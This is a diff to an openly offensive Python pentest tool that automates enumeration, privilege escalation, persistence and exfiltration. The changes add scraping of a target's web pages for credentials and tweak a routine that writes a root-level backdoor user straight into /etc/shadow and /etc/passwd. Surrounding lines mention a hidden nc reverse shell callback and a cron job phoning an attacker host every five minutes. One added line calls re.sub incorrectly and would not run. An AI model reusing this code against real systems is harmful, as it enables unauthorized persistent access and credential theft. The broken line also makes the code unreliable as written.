@@ -3,6 +3,7 @@
 # Copyright (c) 2023 suffs811
 # https://github.com/suffs811/the-terminator.git
 # read the README.md file for more details; software distributed under MIT license
+#
 # <> purpose: automate enumeration, privilege escalation, persistence, exfiltration, and reporting stages of a pentest
 # initial shell will need to be done manually
 #
@@ -59,7 +60,7 @@ print('''
    | |  | |__  | |__) | \  / | | | |  \| |  /  \  | | | |  | | |__) |
    | |  |  __| |  _  /| |\/| | | | | . ` | / /\ \ | | | |  | |  _  / 
    | |  | |____| | \ \| |  | |_| |_| |\  |/ ____ \| | | |__| | | \ \ 
-   |_|  |______|_|  \_\_|  |_|_____|_| \_/_/    \_\_|  \____/|_|  \_\
+   |_|  |______|_|  \_\_|  |_|_____|_| \_/_/    \_\_|  \____/|_|  \_\ 
 \n
 \\ created by: suffs811
 \\ https://github.com/suffs811/the-terminator.git
@@ -123,7 +124,7 @@ def init_scan(ip):
    return services
 
 
-# enumerate web service with nikto, gobuster, curl, and searchsploit
+# enumerate web service with nikto, gobuster, curl
 def web(ip,wordlist,services):
    print("\n### initiating web enumeration... ###")
    web_port = []
@@ -159,7 +160,27 @@ def web(ip,wordlist,services):
             else:
                continue
 
+      # look for 'username' and 'password' in web page source code
+      os.system("echo '/# curl results #' > /terminator/curl.txt")
+      os.system("curl http://{}:{} >> /terminator/curl.txt".format(ip,port.strip()))
+      curl = open("/terminator/curl.txt")
+      c = curl.readlines()
+      for line in c:
+         x = re.sub("\"",line)
+         for sec in x:
+            if "html" in line or "htm" in line or "php" in line or "css" in line:
+               os.system("curl http://{}:{}/{} > /terminator/curl_find.txt".format(ip,port.strip(),sec))
+               curl_find = open("/terminator/curl_find.txt")
+               c_find = curl_find.readlines()
+               for lin in c_find:
+                  if "password" in lin or "username" in lin:
+                     os.system("echo '{} #found in {}#' | tee -a /terminator/enum.txt /terminator/curl_pass.txt".format(lin,sec))
+               curl_find.close()
+      curl.close()
+
    print("\n### web enum output saved to /terminator/enum.txt ###")
+   os.system("rm -f /terminator/curl.txt")
+   os.system("rm -f /terminator/curl_find.txt")
 
 
 # use enum4linux and nmap to enumerate smb shares/users
@@ -262,6 +283,10 @@ def imp_enum(ip):
    os.system("echo '' >> /terminator/imp_enum_results.txt")
    os.system("echo 'robots.txt:' >> /terminator/imp_enum_results.txt")
    os.system("cat /terminator/robots_dir.txt >> /terminator/imp_enum_results.txt 2>/dev/null")
+   os.system("echo '' >> /terminator/imp_enum_results.txt")
+   os.system("echo 'possible user/pass from web pages:' >> /terminator/imp_enum_results.txt")
+   os.system("cat /terminator/curl_pass.txt >> /terminator/imp_enum_results.txt 2>/dev/null")
+   os.system("echo '' >> /terminator/imp_enum_results.txt")
    os.system("cat /terminator/ftp_enum.txt >> /terminator/imp_enum_results.txt 2>/dev/null")
    os.system("echo '' >> /terminator/imp_enum_results.txt")
    os.system("cat /terminator/smb_enum.txt >> /terminator/imp_enum_results.txt 2>/dev/null")
@@ -274,6 +299,7 @@ def imp_enum(ip):
    # delete temp enum files
    os.system("rm -f /terminator/robots_dir.txt 2>/dev/null")
    os.system("rm -f /terminator/web_enum.txt 2>/dev/null")
+   os.system("rm -f /terminator/curl_pass.txt 2>/dev/null")
    os.system("rm -f /terminator/ftp_enum.txt 2>/dev/null")
    os.system("rm -f /terminator/smb_enum.txt 2>/dev/null")
    os.system("rm -f /terminator/nfs.txt 2>/dev/null")
@@ -580,7 +606,7 @@ def perm_check():
 
 # add user with root perms
 def add_user(username,password):
-   if username:
+   if username and password:
       print("\n### establishing persistence... ###")
       os.system("mkpasswd {} > /tmp/backups/pass.txt".format(password))
       pass_file = open("/tmp/backups/pass.txt", "r")
@@ -588,10 +614,10 @@ def add_user(username,password):
       os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
       os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
       os.system("usermod -aG sudo {}".format(username))
-      print("\n### user {} created and added to sudo group ###\n### to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command ###".format(username,username))
+      print("\n### user {}:{} created and added to sudo group ###\n### to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command ###".format(username,password,username))
       pass_file.close()
    else:
-      print("\n*** error: username not specified: use -u to specify username ***")
+      print("\n*** error: username/password not specified: use -u to specify username and -p to specify password ***")
       return
 
 
@@ -629,7 +655,7 @@ def extract(username,password,local_ip,local_port):
 
    # add peristence data to file
    os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
-   os.system("echo 'user {}:{} was added with root privileges...to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command to create ssh keys' >> /tmp/data_exfil.txt".format(username,password))
+   os.system("echo 'user {}:{} was added with root privileges...to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command to create ssh keys' >> /tmp/data_exfil.txt".format(username,password,username))
    os.system("echo 'nc reverse shell callback implanted at /dev/shm/.data/data_log' >> /tmp/data_exfil.txt")
    os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
 
